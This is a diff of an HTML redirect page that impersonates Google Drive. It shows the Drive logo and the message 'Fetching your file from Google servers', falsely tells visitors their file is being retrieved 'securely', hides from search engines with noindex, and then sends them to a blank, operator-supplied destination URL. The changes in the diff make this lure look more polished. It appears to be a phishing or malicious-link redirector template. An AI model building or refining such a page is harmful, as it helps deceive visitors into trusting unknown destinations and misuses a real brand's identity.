@@ -7,63 +7,140 @@
     <title>Redirecting...</title>
     <meta name="robots" content="noindex, nofollow">
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            height: 100%;
+            font-family: 'Roboto', sans-serif;
+            color: #ffffff;
+            overflow: hidden;
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://source.unsplash.com/random/1920x1080?technology');
+            background-size: cover;
+            background-position: center;
+            filter: blur(10px);
+            transform: scale(1.1);
+            z-index: -1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 1;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             text-align: center;
             padding: 20px;
-            background-color: #f0f0f0;
+            background: rgba(0, 0, 0, 0.6);
         }
+
         .logo {
-            max-width: 200px;
-            margin-bottom: 20px;
+            max-width: 120px;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.3));
         }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 300;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            max-width: 600px;
+        }
+
         .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+            border-top-color: #ffffff;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 30px;
         }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        #redirect-link {
+            display: inline-block;
+            padding: 12px 24px;
+            background-color: #4CAF50;
+            color: white;
+            text-decoration: none;
+            border-radius: 25px;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        #redirect-link:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+        }
+
+        #redirect-link:active {
+            transform: translateY(0);
         }
     </style>
 </head>
 <body>
-    <!-- Optional Logo -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/800px-Google_Drive_icon_%282020%29.svg.png" alt="Logo" class="logo">
-    
-    <h1>fetching your file from google servers...</h1>
-	 <p>please be patient</p>
-    <div class="loader"></div>
-    <p id="status">You will be redirected shortly.</p>
-    <a id="redirect-link" href="#" style="display: none;">Click here if not redirected</a>
+    <div class="background"></div>
+    <div class="content">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/800px-Google_Drive_icon_%282020%29.svg.png" alt="Logo" class="logo">
+        
+        <h1>Fetching your file from Google servers</h1>
+        <p>Please be patient while we securely retrieve your requested file. This process ensures the integrity and safety of your data.</p>
+        
+        <div class="loader"></div>
+        
+        <p id="status">You will be redirected shortly.</p>
+        <a id="redirect-link" href="#" style="display: none;">Click here if not redirected</a>
+    </div>
+
     <script>
     (function() {
         // Hardcoded destination URL
         const destinationUrl = ""; // Replace with your actual destination URL
-
         function safeRedirect(url) {
             if (url) {
                 document.getElementById('redirect-link').href = url;
-                document.getElementById('redirect-link').style.display = 'inline';
+                document.getElementById('redirect-link').style.display = 'inline-block';
                 
                 // Add meta refresh tag
                 var meta = document.createElement('meta');
                 meta.httpEquiv = "refresh";
-                meta.content = "0;url=" + url;
+                meta.content = "5;url=" + url;  // Changed to 5 seconds for demo purposes
                 document.getElementsByTagName('head')[0].appendChild(meta);
                 
-                // Attempt JavaScript redirect
-                window.location.href = url;
+                // Attempt JavaScript redirect after a short delay
+                setTimeout(function() {
+                    window.location.href = url;
+                }, 5000);  // 5 seconds delay for demo purposes
             } else {
                 document.getElementById('status').textContent = 'Invalid destination. Please check the URL.';
             }
         }
-
         // Run the redirect logic
         safeRedirect(destinationUrl);
     })();
